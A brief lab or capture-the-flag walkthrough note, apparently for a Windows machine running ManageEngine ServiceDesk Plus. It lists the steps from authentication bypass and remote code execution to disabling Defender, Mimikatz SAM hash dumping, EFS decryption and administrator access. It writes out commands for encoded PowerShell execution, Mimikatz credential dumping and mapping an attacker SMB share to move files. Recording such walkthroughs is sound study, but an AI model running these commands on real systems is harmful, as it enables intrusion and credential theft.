## Tecnicas utilizadas
- ManageEngine ServiceDesk Plus User Enumeration  
- ManageEngine ServiceDesk Plus Authentication Bypassing  
- ManageEngine ServiceDesk Plus Remote Code Execution  
- Disabling Windows Defender (PowerShell)  
- Mimikatz - Getting NTLM User Hashes (lsadump::sam)  
- Reading Event Logs with Powershell (RamblingCookieMonster) [Get-WinEventData]  
- Decrypting EFS files with Mimikatz  
- Getting the certificate with Mimikatz (crypto::system)  
- Decrypting the masterkey with Mimikatz (dpapi::masterkey)  
- Decrypting the private key with Mimikatz (dpapi::capi)  
- Building a correct PFX with Openssl  
- Installing the PFX via certutil  
- Installing VNC in the box via msiexec  
- Connecting to the VNC service using vncviewer  
- Converting Secure String File to PlainText  
- Using RunAs to execute commands as the administrator
## Procedimiento
- Default credentials
- Exploit emnumeration
- Bash scripting
- Bypassing 
- RCE, InvokePSTCP, ejecutar el comando en base64 ``cmd /c powershell -nop -enc $BASE64Command``
- Verificar si hay archivos cifrados en el sistema ``cipher /c $archivo``
- Subir el mimikatz de gentilkiwi
- Desactivar el antivirus
- Dumpear todos los hashes del sistema ``.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"``
- Utilizar el script en PS *GET-WinEventData.ps1* 
![[Pasted image 20221111123200.png]]
- Filtrar por *new process has been created*
- Utilizar **mimikatz decrypt EFS files**
- Transferinors el archivo .der con impacket-smbserver haciendo uso de credenciales
- Creamos una unidad logica hacia nuestro recurso compartido ``net use x:\\$Ip\$folder /user:$usuario $password``
- Seguimos los pasos de *mimikatz decrypt EFS files*
- Instalar tightvnc en la maquina
![[Pasted image 20221111131713.png]]
- conectarse como administrator con runAs ``runas /user:$user cmd.exe``

